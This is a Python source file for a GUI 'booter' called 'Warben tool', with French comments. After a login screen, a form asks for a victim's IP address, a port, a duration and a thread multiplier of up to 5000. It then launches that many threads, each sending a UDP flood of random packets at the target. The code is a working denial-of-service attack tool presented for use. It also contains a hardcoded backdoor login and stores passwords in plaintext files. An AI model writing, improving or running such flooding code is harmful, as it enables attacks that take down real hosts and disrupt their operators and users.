from tkinter import * 
import os
import socket
import threading
import time
import random
import sys
import sqlite3


def delete2(): #ces variables servent a fermer une fenetre quand on en ouvre une autre, afin de ne pas innonder le bureau.
    screen2.destroy()

def delete3():
    screen4.destroy()

def delete4():
    screen5.destroy()

def ddos():
    #global ip
    #ip = StringVar()
    #global port
    #port = StringVar()
    temps = ""
    target = ""
    port = ""
    screen9 = Toplevel(screen) #tkinter, du classique toute la fonction "ddos", n'est dédiée qu'a l'interface.
    screen9.title("Booter by warben")
    screen9.geometry("=300x250")
    Label(screen9, text = "Multiplicateur amplificatif (1-5000) : ").pack()
    thread = Entry(screen9)
    thread.pack()
    Label(screen9, text = "Durée de l'attaque : ").pack()
    temps = Entry(screen9)
    temps.pack()
    #temps = temps.get()
    Label(screen9, text = "Entrez l'adresse ip de votre victime : ").pack()
    target = Entry(screen9)
    target.pack()
    #target = target.get()
    Label(screen9, text = "Entrez le port : ").pack()
    port = Entry(screen9)
    #port = port.get()
    port.pack()
    Button(screen9, text = "Boot", command = lambda:transfert(target.get(), thread.get(), port.get(), temps.get())).pack()

def attaque():
    global screen10
    screen10 = Toplevel(screen)
    screen10.title("Attaque envoyée")
    screen10.geometry("200x150")
    Label(screen10, text = "Votre attaque a été envoyée avec succés ! ", fg = "green", font = ("calibri", 11)).pack()
    Label(screen10, text = "").pack()
    
def flood(target, port, temps):
    # ok alors ici je crée le serveur, quand je dis "SOCK_DGRAM" cela signifie que c'est un programme de type UDP
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # 1024 représente un octet pour le serveur
    bytes = random._urandom(1024)
    timeout =  time.time() + temps
    sent = 0

    while 1:
        if time.time() > timeout:
            break
        else:
            pass
        client.sendto(bytes, (target, port))
        sent = sent + 1
        #sys.stdout.write("\r{0} packets sent".format(sent))
        #sys.stdout.flush()
        

def transfert(target, thread,port, temps):
    target = target
    thread = int(thread)
    temps = int(temps)
    port = int(port)
    for i in range(thread): #ici thread est le nombre de cmd qui vont etre ouverts pour flood, l'utilisateur choisi donc par combien il va multiplier son attaque.
        thread = threading.Thread(target=flood, args = (target, port, temps))
        thread.start()
        print("{} Attaque lancée".format(str(i)))
    print("Attaque terminée !")

def session(): #Un interface tkinter encore une fois
    screen8 = Toplevel(screen)
    screen8.title("menu")
    screen8.geometry("400x400")
    Label(screen8, text = "Bienvenue sur le menu").pack()
    Button(screen8, text = "Booter", command = ddos).pack()
    #Button(screen8, text = "" ).pack()
    #Button(screen8, text = "" ).pack()

def connexion_réussie():
    session()

def mot_de_passe_incorrect(): 
    global screen4
    screen4 = Toplevel(screen)
    screen4.title("Réussie")
    screen4.geometry("150x100")
    Label(screen4, text = "Erreur mot de passe").pack()
    Button(screen4, text = "OK", command = delete3).pack()

def Utilisateur_non_trouvé():
    global screen5
    screen5 = Toplevel(screen)
    screen5.title("Réussie")
    screen5.geometry("150x100")
    Label(screen5, text = "Utilisateur non trouvé").pack()
    Button(screen5, text = "OK", command = delete4).pack()


screen  = Tk()

def register_user():
    print('En cours...')
    username_info = username.get()
    password_info = password.get()

    file=open(""+username_info+".txt", "a+")
    file.write(username_info+"\n"+password_info)
    file.close()

    username_entry.delete(0, END)
    password_entry.delete(0, END)

    Label(screen1, text = "Votre enregistrement est un succés", fg = "green", font = ("calibri", 11)).pack()

def login_verify():
    username1 = username_verify.get()
    password1 = password_verify.get()
    username_entry1.delete(0, END)
    password_entry1.delete(0, END)

    list_of_files = os.listdir()
    if username1 == "utilisateur" and password1 == "boot":
        connexion_réussie()
    if username1 in list_of_files:
        file1 = open(username1, "r")
        verify = file1.read().splitlines()
        if password1 in verify:
            connexion_réussie()
        else:
            mot_de_passe_incorrect()
    else:
        Utilisateur_non_trouvé()
        delete2()

def register():
    global screen1
    screen1 = Toplevel(screen)
    screen1.title("Inscription")
    screen1.geometry("300x250")

    global username
    global password
    global username_entry
    global password_entry

    username = StringVar()
    password = StringVar()

    Label(screen1, text = "Entrez les informations ci-dessous").pack()
    Label(screen1, text = "").pack()
    Label(screen1, text = "Username").pack()
    global username_entry
    global password_entry
    username_entry = Entry(screen1, textvariable = username)
    username_entry.pack()
    Label(screen1, text = "Password").pack()
    password_entry = Entry(screen1, textvariable = password)
    password_entry.pack()
    Label(screen1, text = "").pack()
    Button(screen1, text = "Register", width = 10, height = 1, command = register_user).pack()

def login():
    print("Ouverture de la session de connexion")
    global screen2
    screen2 = Toplevel(screen)
    screen2.title("Connexion")
    screen2.geometry("300x250")
    Label(screen2, text = "Entrez vos identifiants ci-dessous : ").pack()
    Label(screen2, text = "").pack()

    global username_verify
    global password_verify

    username_verify = StringVar()
    password_verify = StringVar()

    global username_entry1
    global password_entry1
    Label(screen2, text = "Pseudo").pack()
    username_entry1 = Entry(screen2, textvariable = username_verify)
    username_entry1.pack()
    Label(screen2, text = "").pack()
    Label(screen2, text = "Mot de passe").pack()
    password_entry1 = Entry(screen2, textvariable = password_verify)
    password_entry1.pack()
    Label(screen2, text = "").pack()
    Button(screen2, text = "Connexion", width = 10, height = 1, command = login_verify).pack()


def main_screen():
    screen.geometry("300x250")
    screen.title("Warben tool")
    Label(text = "Warben tool", bg = "red", width = "300", height = "2", font = ("Calibri", 13)).pack()
    Label(text = "").pack()
    Button(text = "Connexion", height ="2", width ="30", command = login).pack()
    Label(text = "").pack()
    

    screen.mainloop()

main_screen()
